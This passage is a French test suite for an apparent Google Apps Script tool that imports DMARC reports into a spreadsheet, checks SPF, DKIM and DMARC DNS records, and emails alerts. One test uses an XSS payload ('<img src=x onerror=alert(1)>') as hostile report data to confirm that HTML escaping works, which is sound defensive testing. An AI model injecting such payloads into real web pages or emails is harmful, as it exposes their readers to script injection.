        ["'r-2", 'yahoo.com', 'x', debut, debut, 'd.fr', 'r', 'r', 'none', 'none', 100, 'f', new Date()]]);
    enr.getRange(1, 1, 4, 13).setValues([[...entetesE],
        ["'r-1", 'd.fr', '1.1.1.1', 3, 'none', 'pass', 'pass', 'd.fr', 'd.fr', '', '', '', ''],
        ["'r-2", 'd.fr', '2.2.2.2', 4, 'none', 'pass', 'pass', 'd.fr', 'd.fr', '', '', '', ''],
        ["'orphelin", 'd.fr', '3.3.3.3', 5, 'none', 'pass', 'pass', 'd.fr', 'd.fr', '', '', '', '']]);
    return p;
};

test('migration v1.6.0 : les onglets existants reçoivent leur clé, une seule fois, et le bilan le dit', () => {
    const p = classeurAncienFormat();
    const bilan = p.traiter();
    assert.match(bilan, /Migration v1\.6\.0 : clé émetteur\|identifiant ajoutée à 2 rapports et 3 enregistrements\. 1 enregistrement\(s\) sans rapport unique/);
    const rap = p.classeur.getSheetByName('Rapports');
    const enr = p.classeur.getSheetByName('Enregistrements');
    assert.strictEqual(rap.getRange(1, 14).getValues()[0][0], 'cle');
    assert.deepStrictEqual(rap.lignes().map(l => l[13]), ['google.com|r-1', 'yahoo.com|r-2']);
    assert.deepStrictEqual(enr.lignes().map(l => l[13]), ['google.com|r-1', 'yahoo.com|r-2', '']);
    assert.doesNotMatch(p.traiter(), /Migration/, 'la migration a été refaite');
});

test('migration v1.6.0 : les valeurs d\'abord, l\'en-tête ensuite — une interruption la fait recommencer', () => {
    const p = classeurAncienFormat();
    ['Rapports', 'Enregistrements'].forEach(n => { p.classeur.getSheetByName(n).operations = []; });
    p.traiter();
    ['Rapports', 'Enregistrements'].forEach((n) => {
        const ops = p.classeur.getSheetByName(n).operations.filter(o => o[0] === 'setValues');
        const valeurs = ops.findIndex(o => o[1] === 2);
        const entete = ops.findIndex(o => o[1] === 1);
        assert.ok(valeurs >= 0 && entete > valeurs, `${n} : en-tête posé avant les valeurs ${JSON.stringify(ops)}`);
    });
});

test('défaut v0 : les alertes ne mêlent pas les enregistrements de deux émetteurs au même report_id', () => {
    const p = chargerProjet();
    // Ancien rapport de yahoo, massivement non conforme ; rapport récent de google, même id.
    poserRapport(p, { id: '777', org: 'yahoo.com', joursAvant: 5, recuIlYa: 4 * UN_JOUR,
        enregistrements: [['198.51.100.1', 500, 'none', 'fail', 'fail']] });
    poserRapport(p, { id: '777', org: 'google.com', enregistrements: [['203.0.113.1', 20, 'none', 'pass', 'pass']] });
    const anomalies = detecter(p).filter(a => a.type !== 'SILENCE');
    assert.deepStrictEqual([...anomalies], [], 'les 500 échecs de yahoo ont été comptés dans le rapport de google');
});

test('défaut v0 : la purge d\'un rapport n\'emporte pas celui d\'un autre émetteur au même report_id', () => {
    const p = chargerProjet();
    poserRapport(p, { id: '777', org: 'yahoo.com', joursAvant: 200, recuIlYa: 199 * UN_JOUR,
        enregistrements: [['198.51.100.1', 5, 'none', 'pass', 'pass']] });
    poserRapport(p, { id: '777', org: 'google.com', enregistrements: [['203.0.113.1', 20, 'none', 'pass', 'pass']] });
    const r = purger(p);
    assert.strictEqual(r.rapportsPurges, 1);
    assert.strictEqual(r.enregPurges, 1);
    assert.deepStrictEqual(p.classeur.getSheetByName('Rapports').lignes().map(l => l[1]), ['google.com']);
    assert.deepStrictEqual(p.classeur.getSheetByName('Enregistrements').lignes().map(l => l[2]), ['203.0.113.1']);
});

test('défaut v0 : le tableau de bord joint les enregistrements à leur rapport par la clé', () => {
    const don = creerTableau().classeur.getSheetByName('_Données');
    const f = don.formules.get('2,1');
    assert.match(f, /VLOOKUP\('Enregistrements'!N2:N,HSTACK\('Rapports'!N2:N,'Rapports'!D2:D\),2,FALSE\)/);
    assert.match(f, /VLOOKUP\('Enregistrements'!N2:N,HSTACK\('Rapports'!N2:N,'Rapports'!B2:B\),2,FALSE\)/);
    assert.doesNotMatch(f, /VLOOKUP\('Enregistrements'!A2:A/, 'jointure par le seul report_id');
});

/* --------------------------------------------------------------------------
 * v1.6.1 — une erreur de Google dit à quelle étape elle survient
 * ----------------------------------------------------------------------- */

/** Classeur prêt pour la création du tableau de bord. */
const classeurPourTableau = () => {
    const p = chargerProjet();
    ['Rapports', 'Enregistrements'].forEach((n) => {
        const entetes = [...p.lire(n === 'Rapports' ? 'ENTETES_RAPPORTS' : 'ENTETES_ENREG')];
        p.classeur.insertSheet(n).getRange(1, 1, 1, entetes.length).setValues([entetes]);
    });
    return p;
};
const ECHEC_GOOGLE = 'Échec du service Feuilles de calcul';

test('défaut v1.6.0 : l\'échec du calcul des formules est nommé, journalisé, et la langue rétablie', () => {
    const p = classeurPourTableau();
    let premier = true;
    p.sandbox.SpreadsheetApp.flush = () => { if (premier) { premier = false; throw new Error(ECHEC_GOOGLE); } };
    p.lire('creerTableauDeBord()');
    const erreur = p.journal.find(([n]) => n === 'error');
    assert.ok(erreur, 'aucune erreur signalée');
    assert.match(erreur[1], /Échec à l'étape « calcul des formules sous en_US \(flush\) » : Échec du service/);
    assert.match(p.classeur.getSheetByName('Journal').lignes()[0][2], /^ÉCHEC — Échec à l'étape « calcul des formules/);
    assert.strictEqual(p.classeur.getSpreadsheetLocale(), 'fr_FR');
});

test('l\'étape nommée est bien celle qui échoue, pas la dernière commencée', () => {
    const p = classeurPourTableau();
    const inserer = p.classeur.insertSheet.bind(p.classeur);
    p.classeur.insertSheet = (nom, ...reste) => {
        const sh = inserer(nom, ...reste);
        if (nom === '_Données') sh.hideSheet = () => { throw new Error(ECHEC_GOOGLE); };
        return sh;
    };
    p.lire('creerTableauDeBord()');
    const erreur = p.journal.find(([n]) => n === 'error');
    assert.match(erreur[1], /« masquage de l'onglet _Données »/);
});

/* --------------------------------------------------------------------------
 * v1.7.0 — diagnostic DKIM : cassé en route ou absent
 * ----------------------------------------------------------------------- */

test('diagnostic DKIM : les cas relevés dans les rapports réels', () => {
    const p = chargerProjet();
    const diag = p.lire('diagnosticDkim_');
    const D = p.lire('DIAGNOSTICS_DKIM');
    // Transfert par une passerelle : signature du domaine présente, invalidée en route.
    assert.strictEqual(diag('expediteur.example', 'expediteur.example', 'fail'), D.CASSE);
    // Transfert par un tenant Microsoft 365 qui re-signe : la signature d'origine reste cassée.
    assert.strictEqual(diag('expediteur.example', 'partenaire.example, expediteur.example', 'pass, fail'), D.CASSE);
    // Usurpation typique : aucune signature.
    assert.strictEqual(diag('expediteur.example', '', ''), D.ABSENT);
    assert.strictEqual(diag('expediteur.example', undefined, undefined), D.ABSENT);
    assert.strictEqual(diag('expediteur.example', 'expediteur.example', 'pass'), D.VALIDE);
    assert.strictEqual(diag('Expediteur.EXAMPLE', 'EXPEDITEUR.example.', 'PASS'), D.VALIDE, 'casse et point final');
    assert.strictEqual(diag('mail.expediteur.example', 'expediteur.example', 'fail'), D.CASSE, 'sous-domaine');
    assert.strictEqual(diag('expediteur.example', 'mailjet.com', 'pass'), D.TIERS);
    assert.strictEqual(diag('expediteur.example', 'notexpediteur.example', 'pass'), D.TIERS, 'un simple suffixe n\'est pas le domaine');
    // Rapport AMAZON-SES muet sur DKIM : l'absence ne prouve rien.
    assert.strictEqual(diag('expediteur.example', '', '', false), D.NON_RENSEIGNE);
    assert.strictEqual(diag('expediteur.example', 'expediteur.example', 'fail', false), D.CASSE, 'une signature signalée reste lue');
});

test('défaut v1.7.0 : un rapport muet sur DKIM ne transforme pas ses messages en usurpations', () => {
    const p = chargerProjet();
    const muet = rapportXml({ id: 'ses-1', enregistrements: [['198.51.100.74', 3, 'fail', 'fail']] })
        .replace(/<dkim>[\s\S]*?<\/dkim>/g, (m) => (m.includes('<domain>') ? '' : m));
    p.gmail.ajouterFil(message(blobXml('ses.xml', muet)));
    p.gmail.ajouterFil(message(blobXml('g.xml', rapportXml({ id: 'g-1', enregistrements: [['203.0.113.240', 1, 'fail', 'fail']] })
        .replace(/<auth_results>[\s\S]*?<\/auth_results>/, '<auth_results><spf><domain>example.net</domain><result>fail</result></spf></auth_results>')
        .replace('</feedback>', rapportXml({ id: 'x', enregistrements: [['203.0.113.9', 5, 'pass', 'pass']] })
            .match(/<record>[\s\S]*<\/record>/)[0] + '</feedback>'))));
    p.traiter();
    const diag = Object.fromEntries(p.classeur.getSheetByName('Enregistrements').lignes().map(l => [l[2], l[14]]));
    assert.strictEqual(diag['198.51.100.74'], 'DKIM non renseigné', 'rapport sans aucun détail DKIM');
    assert.strictEqual(diag['203.0.113.240'], 'DKIM absent', 'le même rapport détaille DKIM pour un autre message');
});

test('le diagnostic DKIM est écrit à l\'enregistrement de chaque groupe de messages', () => {
    const p = chargerProjet();
    // rapportXml : 1er groupe DKIM pass (+ mailer.example), 2e groupe DKIM du domaine en échec.
    p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    p.traiter();
    const enr = p.classeur.getSheetByName('Enregistrements');
    assert.strictEqual(enr.getRange(1, 15).getValues()[0][0], 'dkim_diag');
    assert.deepStrictEqual(enr.lignes().map(l => l[14]), ['DKIM valide', 'DKIM cassé']);
});

test('migration v1.7.0 : les enregistrements existants reçoivent leur diagnostic, une seule fois', () => {
    const p = chargerProjet();
    const entetesR = [...p.lire('ENTETES_RAPPORTS')];
    const entetesE = p.lire('ENTETES_ENREG').slice(0, 14); // format 1.6 : avec cle, sans dkim_diag
    p.classeur.insertSheet('Rapports').getRange(1, 1, 1, entetesR.length).setValues([entetesR]);
    const enr = p.classeur.insertSheet('Enregistrements');
    enr.getRange(1, 1, 3, 14).setValues([[...entetesE],
        ["'r-1", 'd.fr', '1.1.1.1', 3, 'reject', 'fail', 'fail', 'd.fr', 'd.fr', 'd.fr', 'fail', '', '', "'x|r-1"],
        ["'r-1", 'd.fr', '2.2.2.2', 4, 'reject', 'fail', 'fail', 'd.fr', '', '', '', '', '', "'x|r-1"]]);
    enr.operations = [];
    const bilan = p.traiter();
    assert.match(bilan, /Migration v1\.7\.0 : diagnostic DKIM calculé pour 2 enregistrements/);
    assert.deepStrictEqual(enr.lignes().map(l => l[14]), ['DKIM cassé', 'DKIM absent'],
        'le rapport r-1 détaille DKIM pour une ligne : l\'absence sur l\'autre est informative');
    const ops = enr.operations.filter(o => o[0] === 'setValues');
    assert.ok(ops.findIndex(o => o[1] === 2) < ops.findIndex(o => o[1] === 1), 'en-tête posé avant les valeurs');
    assert.doesNotMatch(p.traiter(), /Migration v1\.7\.0/);
});

test('le tableau de bord montre le diagnostic DKIM : Top 15 et tableau des non conformes', () => {
    const p = creerTableau();
    const don = p.classeur.getSheetByName('_Données');
    assert.strictEqual(don.formules.get('2,25'), "=IFERROR(FILTER('Enregistrements'!O2:O,'Enregistrements'!A2:A<>\"\"),\"\")");
    const tdb = p.classeur.getSheetByName('Tableau de bord');
    assert.match(tdb.formules.get('46,2'), /select B, C, I, E, Y, sum\(D\) .* group by B, C, I, E, Y .* Y 'DKIM'/);
    assert.match(tdb.formules.get('46,2'), /QUERY\('_Données'!A2:Y,/);
    const lignes = [66, 67, 68].map(l => [tdb.getRange(l, 5).getValues()[0][0], tdb.formules.get(`${l},6`)]);
    assert.deepStrictEqual(lignes.map(([d]) => d), ['DKIM cassé', 'DKIM d\'un tiers', 'DKIM absent']);
    assert.strictEqual(tdb.getRange(69, 5).getValues()[0][0], 'DKIM non renseigné');
    lignes.forEach(([d, f]) => assert.ok(f.includes(`'_Données'!Q2:Q=0`) && f.includes(`Y2:Y="${d}"`), f));
    // Le nom d'hôte a glissé en colonne H, sans perdre son IP de référence.
    assert.ok(tdb.formules.get('47,8').includes('C47'));
    assert.ok(!tdb.formules.has('47,7'), 'une formule de nom d\'hôte est restée en colonne G');
});

/* --------------------------------------------------------------------------
 * v1.7.1 — reprise sur erreur de service de Google
 * ----------------------------------------------------------------------- */

/** Le message exact reçu dans le classeur réel. */
const ERREUR_SERVICE_REELLE = 'Échec du service Feuilles de calcul lors de l\'accès au document portant l\'ID 1AbCdEfGhIjK.';

/** Classeur prêt, dont l'insertion de `nom` échoue `n` fois avec `erreur` ; `creer` : l'onglet est créé malgré l'erreur. */
const insertionQuiEchoue = (nom, n, erreur = ERREUR_SERVICE_REELLE, creer = false) => {
    const p = classeurPourTableau();
    const inserer = p.classeur.insertSheet.bind(p.classeur);
    p.essais = 0;
    p.classeur.insertSheet = (nomOnglet, ...reste) => {
        if (nomOnglet === nom) {
            p.essais += 1;
            if (p.essais <= n) {
                if (creer) inserer(nomOnglet, ...reste);
                throw new Error(erreur);
            }
        }
        return inserer(nomOnglet, ...reste);
    };
    return p;
};

test('les erreurs de service de Google sont reconnues, en français comme en anglais', () => {
    const service = chargerProjet().lire('estErreurDeService_');
    assert.ok(service(new Error(ERREUR_SERVICE_REELLE)));
    assert.ok(service(new Error('Service Spreadsheets failed while accessing document with id 1N6s.')));
    assert.ok(!service(new TypeError('Cannot read properties of undefined')));
    assert.ok(!service(new Error('A sheet with the name "Aide" already exists.')));
});

test('défaut v1.7.0 : une erreur de service passagère à la création des onglets est rattrapée et journalisée', () => {
    const p = insertionQuiEchoue('Tableau de bord', 1);
    p.lire('creerTableauDeBord()');
    assert.ok(!p.journal.some(([n]) => n === 'alert'), 'une alerte d\'échec a été affichée');
    assert.ok(p.classeur.getSheetByName('Tableau de bord') && p.classeur.getSheetByName('_Données'));
    assert.strictEqual(p.essais, 2);
    assert.match(p.classeur.getSheetByName('Journal').lignes().map(l => l[2]).join('\n'),
        /Tableau de bord créé, après 1 nouvelle\(s\) tentative\(s\)/);
});

test('une erreur de service persistante est abandonnée après 3 essais, avec l\'étape et le nombre de reprises', () => {
    const p = insertionQuiEchoue('_Données', 99);
    p.lire('creerTableauDeBord()');
    assert.strictEqual(p.essais, 3);
    const erreur = p.journal.find(([n, m]) => n === 'error' && m.startsWith('Création du tableau de bord'))[1];
    assert.match(erreur, /Échec à l'étape « création des onglets Tableau de bord et _Données » \(après 2 nouvelle\(s\) tentative\(s\)\)/);
});

test('une erreur qui n\'est pas de service n\'est jamais relancée', () => {
    const p = insertionQuiEchoue('Tableau de bord', 99, 'Cannot read properties of undefined');
    p.lire('creerTableauDeBord()');
    assert.strictEqual(p.essais, 1, 'une erreur de programmation a été relancée');
});

test('un onglet créé malgré l\'erreur signalée est repris, pas recréé en double', () => {
    const p = insertionQuiEchoue('Tableau de bord', 1, ERREUR_SERVICE_REELLE, true);
    p.lire('creerTableauDeBord()');
    assert.ok(!p.journal.some(([n, m]) => n === 'error' && /already exists/.test(m)), JSON.stringify(p.journal));
    assert.ok(p.classeur.getSheetByName('Tableau de bord').formules.size > 0, 'l\'onglet repris n\'a pas été construit');
});

test('défaut v1.7.1 : chaque création réussie du tableau de bord est journalisée', () => {
    // Deux échecs suivis d'une réussite silencieuse laissaient croire à un
    // tableau de bord jamais créé.
    const p = classeurPourTableau();
    p.lire('creerTableauDeBord()');
    const lignes = p.classeur.getSheetByName('Journal').lignes();
    assert.strictEqual(lignes.length, 1);
    assert.match(lignes[0][1], /^création du tableau de bord · v/);
    assert.strictEqual(lignes[0][2], 'Tableau de bord créé.');
});

/* --------------------------------------------------------------------------
 * Jeu de démonstration : fictif, reproductible, cohérent avec l'outil
 * ----------------------------------------------------------------------- */

const genererDemo = () => {
    const dossier = fs.mkdtempSync(path.join(require('os').tmpdir(), 'dmarc-demo-'));
    require('child_process').execFileSync('node', [path.join(RACINE, 'demo', 'generer-demo.js'), '2026-09-24'],
        { env: { ...process.env, DMARC_DEMO_SORTIE: dossier }, stdio: 'pipe' });
    const lireCsv = nom => fs.readFileSync(path.join(dossier, nom), 'utf8').trim().split('\r\n').map((l) => {
        const cellules = []; let c = ''; let guillemets = false;
        for (let i = 0; i < l.length; i += 1) {
            const x = l[i];
            if (guillemets) {
                if (x === '"' && l[i + 1] === '"') { c += '"'; i += 1; } else if (x === '"') guillemets = false; else c += x;
            } else if (x === '"') guillemets = true; else if (x === ',') { cellules.push(c); c = ''; } else c += x;
        }
        cellules.push(c);
        return cellules;
    });
    return { dossier, lireCsv };
};

test('le jeu de démonstration est entièrement fictif : domaines .example, IP de documentation', () => {
    const { lireCsv } = genererDemo();
    const [entetes, ...lignes] = lireCsv('Enregistrements.csv');
    const col = n => entetes.indexOf(n);
    const IP_DOC = /^(192\.0\.2|198\.51\.100|203\.0\.113)\.\d{1,3}$/;
    lignes.forEach((l) => {
        assert.match(l[col('source_ip')], IP_DOC, `IP hors plages de documentation : ${l[col('source_ip')]}`);
        ['domaine', 'header_from'].forEach(c => assert.match(l[col(c)], /\.example$/, `${c} : ${l[col(c)]}`));
        [l[col('envelope_from')], ...l[col('dkim_domaines')].split(', '), l[col('spf_domaines')]]
            .filter(Boolean).forEach(d => assert.match(d, /\.example$/, `domaine réel dans les données : ${d}`));
    });
    const [, ...cache] = lireCsv('_CacheIP.csv');
    cache.forEach(([ip]) => assert.match(ip, IP_DOC));
});

test('le jeu de démonstration est reproductible et son diagnostic est celui de l\'outil', () => {
    const a = genererDemo();
    const b = genererDemo();
    ['Rapports.csv', 'Enregistrements.csv', 'RESUME.md'].forEach(f => assert.strictEqual(
        fs.readFileSync(path.join(a.dossier, f), 'utf8'), fs.readFileSync(path.join(b.dossier, f), 'utf8'), f));
    // Le diagnostic écrit doit être celui que l'outil recalculerait, rapport par rapport.
    const diag = chargerProjet().lire('diagnosticDkim_');
    const [entetes, ...lignes] = a.lireCsv('Enregistrements.csv');
    const col = n => entetes.indexOf(n);
    const detailles = new Set(lignes.filter(l => l[col('dkim_domaines')]).map(l => l[col('cle')]));
    lignes.forEach(l => assert.strictEqual(l[col('dkim_diag')], diag(l[col('header_from')], l[col('dkim_domaines')],
        l[col('dkim_resultats')], detailles.has(l[col('cle')]))));
    // Aucun identifiant numérique : il serait converti en nombre à l'import CSV.
    lignes.forEach(l => assert.doesNotMatch(l[col('report_id')], /^\d+$/));
});

/* --------------------------------------------------------------------------
 * v1.8.0 — contrôle des enregistrements DNS de chaque domaine
 * ----------------------------------------------------------------------- */

/** Chaîne de 12 include: pour dépasser la limite de 10 consultations. */
const chaineSpf = Object.fromEntries(Array.from({ length: 12 }, (_, i) =>
    [`i${i}.example`, { TXT: [i < 11 ? `v=spf1 include:i${i + 1}.example -all` : 'v=spf1 ip4:192.0.2.99 -all'] }]));

const ZONE_DNS_TEST = {
    // Domaine sain
    'example.net': { TXT: ['google-site-verification=abc', 'v=spf1 include:_spf.envoi.example ip4:192.0.2.1 -all'] },
    '_spf.envoi.example': { TXT: ['v=spf1 ip4:198.51.100.0/24 ~all'] },
    // Casse et suffixe de taille (!10m) : l'adresse doit être reconnue quand même.
    '_dmarc.example.net': { TXT: ['v=DMARC1; p=reject; rua=mailto:DMARC@example.net!10m'] },
    'google._domainkey.example.net': { TXT: ['v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0B'] },
    'monsel._domainkey.example.net': { TXT: ['k=rsa; p=MIGfMA0GCSqG'] },
    // Domaine qui cumule les défauts
    'mauvais.example': { TXT: ['v=spf1 include:i0.example ptr +all'] },
    ...chaineSpf,
    '_dmarc.mauvais.example': { TXT: ['v=DMARC1; p=none; rua=mailto:rapports@prestataire.example'] },
    'selector1._domainkey.mauvais.example': { TXT: ['v=DKIM1; p='] },
    // Deux SPF, pas de DMARC
    'double.example': { TXT: ['v=spf1 -all', 'v=spf1 ip4:192.0.2.9 -all'] },
    // rua vers un domaine externe qui a publié son autorisation
    'externe-ok.example': { TXT: ['v=spf1 -all'] },
    '_dmarc.externe-ok.example': { TXT: ['v=DMARC1; p=quarantine; pct=50; rua=mailto:dmarc@example.net'] },
    'externe-ok.example._report._dmarc.example.net': { TXT: ['v=DMARC1'] }
};

/** Projet dont l'onglet Domaines liste `domaines`, avec l'adresse de l'outil dmarc@example.net. */
const projetDns = (domaines, options = {}) => {
    const p = chargerProjet({ zoneDns: ZONE_DNS_TEST, adresses: ['dmarc@example.net'], ...options });
    const sh = p.classeur.getSheetByName('Domaines');
    domaines.forEach(([d, sel = '']) => sh.appendRow([d, '', '', sel]));
    return p;
};
const controler = p => p.lire('controlerDnsDomaines_(SpreadsheetApp.getActiveSpreadsheet())');
const constatsDns = p => p.classeur.getSheetByName('Contrôle DNS').lignes(7)
    .map(([domaine, element, statut, constat]) => ({ domaine, element, statut, constat }));
const statutsDe = (p, domaine) => constatsDns(p).filter(c => c.domaine === domaine)
    .map(c => `${c.element} : ${c.statut}`);

test('contrôle DNS : un domaine sain est OK sur tous les points', () => {
    const p = projetDns([['example.net']]);
    // L'onglet Domaines de la v1.4.0 n'a pas la colonne selecteurs_dkim : elle est ajoutée.
    assert.deepStrictEqual([...statutsDe((controler(p), p), 'example.net')],
        ['DMARC : OK', 'DMARC rua : OK', 'SPF : OK', 'DKIM : OK']);
    const c = constatsDns(p);
    assert.match(c.find(x => x.element === 'SPF').constat, /^1 consultation\(s\) DNS sur 10/);
    assert.match(c.find(x => x.element === 'DMARC rua').constat, /dmarc@example\.net, relevée par l'outil/);
    assert.match(c.find(x => x.element === 'DKIM').constat, /Clé\(s\) publiée\(s\) : google\./);
});

test('contrôle DNS : chaque défaut connu est signalé, avec la marche à suivre', () => {
    const p = projetDns([['mauvais.example'], ['double.example']]);
    const r = controler(p);
    const c = constatsDns(p);
    const de = (d, el) => c.filter(x => x.domaine === d && x.element === el);
    assert.match(de('mauvais.example', 'SPF').map(x => `${x.statut} ${x.constat}`).join(' | '),
        /Problème au moins \d+ consultations DNS pour une limite de 10.*\| Attention Le mécanisme ptr.*\| Problème Le SPF se termine par \+all/);
    assert.deepStrictEqual(de('mauvais.example', 'DMARC').map(x => x.statut), ['Info']);
    assert.deepStrictEqual(de('mauvais.example', 'DMARC rua').map(x => x.statut), ['Problème', 'Problème'],
        'rua non suivie par l\'outil, et domaine externe non autorisé');
    assert.match(de('mauvais.example', 'DMARC rua')[1].constat, /prestataire\.example n'autorise pas/);
    assert.deepStrictEqual(de('mauvais.example', 'DKIM').map(x => x.statut), ['Attention']);
    assert.deepStrictEqual(de('double.example', 'DMARC').map(x => x.statut), ['Problème']);
    assert.match(de('double.example', 'SPF')[0].constat, /^2 enregistrements SPF/);
    assert.ok(r.problemes >= 6 && r.attentions >= 2, JSON.stringify(r));
});

test('contrôle DNS : une adresse rua externe autorisée est reconnue ; pct < 100 est signalé', () => {
    const p = projetDns([['externe-ok.example']]);
    controler(p);
    const c = constatsDns(p).filter(x => x.domaine === 'externe-ok.example');
    assert.match(c.find(x => x.element === 'DMARC').constat, /p=quarantine, appliquée à 50 %/);
    assert.ok(c.some(x => x.element === 'DMARC rua' && x.statut === 'OK' && /autorise la réception/.test(x.constat)));
});

test('contrôle DNS : une panne donne « Non vérifié », jamais « Problème »', () => {
    const p = projetDns([['example.net'], ['mauvais.example']]);
    p.reseau.dnsEnPanne = true;
    const r = controler(p);
    assert.strictEqual(r.problemes, 0);
    assert.ok(constatsDns(p).every(c => c.statut === 'Non vérifié'), JSON.stringify(constatsDns(p)));
});

test('contrôle DNS : les sélecteurs DKIM indiqués dans l\'onglet Domaines sont essayés', () => {
    const p = projetDns([['example.net', 'monsel, autre']]);
    controler(p);
    assert.match(constatsDns(p).find(c => c.element === 'DKIM').constat, /^Clé\(s\) publiée\(s\) : monsel\./);
    const q = projetDns([['mauvais.example', 'selector1']]);
    controler(q);
    const dkim = constatsDns(q).find(c => c.element === 'DKIM');
    assert.strictEqual(dkim.statut, 'Problème');
    assert.match(dkim.constat, /révoquée\(s\) : selector1/);
});

test('contrôle DNS : l\'onglet ne contient que des valeurs, colorées par statut, et se réécrit sans reste', () => {
    const p = projetDns([['mauvais.example'], ['double.example']]);
    controler(p);
    const sh = p.classeur.getSheetByName('Contrôle DNS');
    assert.strictEqual(sh.formules.size, 0);
    assert.strictEqual(sh.fonds.get('2,3'), p.lire('COULEURS_STATUT_DNS')[sh.getRange(2, 3).getValues()[0][0]]);
    const avant = sh.getLastRow();
    // Lignes de Domaines : en-tête, adresse de l'outil, mauvais.example, double.example.
    p.classeur.getSheetByName('Domaines').getRange(4, 1).setValues([['']]); // retire double.example
    controler(p);
    assert.ok(sh.getLastRow() < avant, 'des constats d\'un domaine retiré sont restés');
    assert.ok(!sh.lignes(7).some(l => l[0] === 'double.example'));
});

test('contrôle DNS : refait une fois par jour par le traitement, et résumé dans le bilan', () => {
    const p = projetDns([['example.net']]);
    const premier = p.traiter();
    assert.match(premier, /Contrôle DNS de 1 domaine\(s\) : 0 problème\(s\), 0 point\(s\) d'attention/);
    assert.doesNotMatch(p.traiter(), /Contrôle DNS/, 'refait avant 24 h');
});

test('contrôle DNS par le menu : onglet affiché, résultat journalisé', () => {
    const p = projetDns([['double.example']]);
    p.lire('controlerDnsDepuisMenu()');
    assert.strictEqual(p.classeur.active, p.classeur.getSheetByName('Contrôle DNS'));
    assert.match(p.classeur.getSheetByName('Journal').lignes()[0][2], /^Contrôle DNS de 1 domaine\(s\) : 2 problème\(s\)/);
});

/* --------------------------------------------------------------------------
 * Numéros de version : un seul courant, des en-têtes qui ne dérivent pas
 * ----------------------------------------------------------------------- */

const versionsDuJournal = () => [...fs.readFileSync(path.join(RACINE, 'CHANGELOG.md'), 'utf8')
    .matchAll(/^## \[(\d+\.\d+\.\d+)\]/gm)].map(m => m[1]);
const comparerVersions = (a, b) => {
    const [x, y] = [a, b].map(v => v.split('.').map(Number));
    return x[0] - y[0] || x[1] - y[1] || x[2] - y[2];
};

/* --------------------------------------------------------------------------
 * v1.9.0 — courriel d'alerte mis en forme
 * ----------------------------------------------------------------------- */

test('courriel d\'alerte : HTML et texte, pied avec produit, auteur, site et version', () => {
    const p = chargerProjet();
    poserRapport(p, { id: 'hier', enregistrements: [['198.51.100.1', 1500, 'reject', 'fail', 'fail']] });
    alerter(p);
    const [courriel] = p.emailsEnvoyes;
    const produit = p.lire('PRODUIT_DMARC');
    const version = p.lire('VERSION_DMARC');

    // Le texte brut reste : messageries sans HTML, aperçu des notifications.
    assert.strictEqual(typeof courriel.body, 'string');
    assert.strictEqual(typeof courriel.htmlBody, 'string');
    assert.strictEqual(courriel.name, produit.NOM);
    [courriel.body, courriel.htmlBody].forEach((corps) => {
        [produit.NOM, produit.AUTEUR, version].forEach(attendu => assert.ok(corps.includes(attendu), attendu));
    });
    assert.ok(courriel.body.includes(produit.SITE));
    assert.match(courriel.htmlBody, new RegExp(`href="${produit.SITE}"`));
    // Les deux rendus disent la même chose : ils viennent des mêmes blocs.
    assert.match(courriel.htmlBody, /Pic de rejets : 1 500 messages/);
    assert.match(courriel.body, /pic de rejets : 1 500 messages/);
    assert.match(courriel.htmlBody, /href="https:\/\/docs\.google\.com\/spreadsheets\/d\/classeur-de-test\/edit"/);
    assert.doesNotMatch(courriel.htmlBody, /usurpation/i);
    assert.doesNotMatch(courriel.body, /\d\.\d\s?%/, 'pourcentage à l\'anglaise');
});

test('courriel d\'alerte : une valeur venue d\'un rapport est échappée dans le HTML', () => {
    // L'IP source est écrite par l'émetteur du rapport, donc par n'importe qui.
    const p = chargerProjet();
    poserRapport(p, { id: 'hostile', enregistrements: [['<img src=x onerror=alert(1)>', 50, 'reject', 'fail', 'fail']] });
    alerter(p);
    const { htmlBody } = p.emailsEnvoyes[0];
    assert.ok(!htmlBody.includes('<img'), 'balise injectée telle quelle');
    assert.ok(htmlBody.includes('&lt;img src=x onerror=alert(1)&gt;'));
});

test('le nom et l\'adresse de l\'auteur ne sont écrits qu\'une fois, dans PRODUIT_DMARC', () => {
    const code = fs.readdirSync(RACINE).filter(f => f.endsWith('.gs'))
        .map(f => fs.readFileSync(path.join(RACINE, f), 'utf8').replace(/const PRODUIT_DMARC[\s\S]*?\}\);/, ''))
        .join('\n');
    assert.doesNotMatch(code, /faucheux\.bzh|Fabrice Faucheux/);
});

test('le CHANGELOG commence par VERSION, sans doublon et dans l\'ordre décroissant', () => {
    const versions = versionsDuJournal();
    const version = fs.readFileSync(path.join(RACINE, 'VERSION'), 'utf8').trim();
    assert.strictEqual(versions[0], version, 'la première entrée du CHANGELOG n\'est pas la version courante');
    const doublons = versions.filter((v, i) => versions.indexOf(v) !== i);
    assert.deepStrictEqual(doublons, [], `entrées en double : ${doublons.join(', ')}`);
    versions.slice(1).forEach((v, i) => assert.ok(comparerVersions(versions[i], v) > 0, `${versions[i]} avant ${v}`));
});

test('chaque fichier dit sa version d\'apparition, qui existe et n\'est pas future', () => {
    // « Introduit en vX » est un fait qui ne change plus ; « ce fichier est en
    // vX » serait un état dupliqué qui dérive à la première retouche.
    const versions = versionsDuJournal();
    fs.readdirSync(SOURCES).filter(n => n.endsWith('.gs')).forEach((nom) => {
        const code = fs.readFileSync(path.join(SOURCES, nom), 'utf8');
        const m = /^ \* Introduit en v(\d+\.\d+\.\d+)\.$/m.exec(code.slice(0, 600));
        assert.ok(m, `${nom} : pas de « Introduit en vX.Y.Z. » dans l'en-tête`);
        assert.ok(versions.includes(m[1]), `${nom} : v${m[1]} absente du CHANGELOG`);
        assert.doesNotMatch(code, /(ce fichier|ce module) est en v\d/i, `${nom} : version courante recopiée`);
    });
});

test('aucun titre du README ne recopie un numéro de version', () => {
    const titres = fs.readFileSync(path.join(RACINE, 'README.md'), 'utf8').split('\n').filter(l => /^#+ /.test(l));
    titres.forEach(t => assert.doesNotMatch(t, /v?\d+\.\d+\.\d+/, t));
});

test('la version se lit là où l\'on se demande ce qui a tourné : alerte, export', () => {
    const version = p => `v${p.lire('VERSION_DMARC')}`;
    const a = chargerProjet();
    poserRapport(a, { id: 'hier', enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    alerter(a);
    assert.ok(a.emailsEnvoyes[0].body.includes(version(a)), 'version absente du courriel d\'alerte');

    const b = classeurAPurger();
    const r = purger(b);
    r.fichiers.forEach(f => assert.ok(f.includes(`_${version(b)}.csv`), f));
});

/* --------------------------------------------------------------------------
 * Exécution
